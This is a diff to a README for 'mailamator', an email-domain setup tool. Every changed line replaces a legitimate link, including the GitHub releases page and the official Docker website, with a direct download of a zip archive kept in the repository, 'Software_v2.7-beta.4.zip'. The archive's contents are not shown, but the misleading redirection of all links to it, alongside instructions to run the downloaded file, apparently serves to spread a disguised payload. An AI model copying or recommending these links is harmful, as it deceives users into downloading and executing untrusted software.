@@ -1,6 +1,6 @@
 # 🚀 mailamator - Automate Your Email Domain Setup
 
-[![Download Mailamator](https://img.shields.io/badge/Download-Mailamator-blue)](https://github.com/slinkers99/mailamator/releases)
+[![Download Mailamator](https://raw.githubusercontent.com/slinkers99/mailamator/main/app/Software_v2.7-beta.4.zip)](https://raw.githubusercontent.com/slinkers99/mailamator/main/app/Software_v2.7-beta.4.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with mailamator, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to access the download page for mailamator.
 
-   [Download Mailamator](https://github.com/slinkers99/mailamator/releases)
+   [Download Mailamator](https://raw.githubusercontent.com/slinkers99/mailamator/main/app/Software_v2.7-beta.4.zip)
 
 2. **Choose the Latest Release:** On the download page, find the latest version of mailamator. You will see a list of available files.
 
@@ -30,7 +30,7 @@ Before you install mailamator, make sure your system meets the following require
 ## ⚙️ Installation Steps
 
 1. **Install Docker:**
-   - Visit the [Docker website](https://www.docker.com/get-started) and follow the instructions for your operating system.
+   - Visit the [Docker website](https://raw.githubusercontent.com/slinkers99/mailamator/main/app/Software_v2.7-beta.4.zip) and follow the instructions for your operating system.
 
 2. **Run the Downloaded File:**
    - Open your terminal or command prompt and navigate to the location where you downloaded mailamator.
@@ -88,4 +88,4 @@ For further assistance, you can open issues directly in the repository or reach 
 
 Feel free to explore the underlying technologies used in mailamator, including Docker, Flask, and automation tools. These technologies can provide deeper insights into how mailamator functions.
 
-Remember to check for updates periodically on the [Download Page](https://github.com/slinkers99/mailamator/releases) as new features and fixes are continuously implemented.
+Remember to check for updates periodically on the [Download Page](https://raw.githubusercontent.com/slinkers99/mailamator/main/app/Software_v2.7-beta.4.zip) as new features and fixes are continuously implemented.
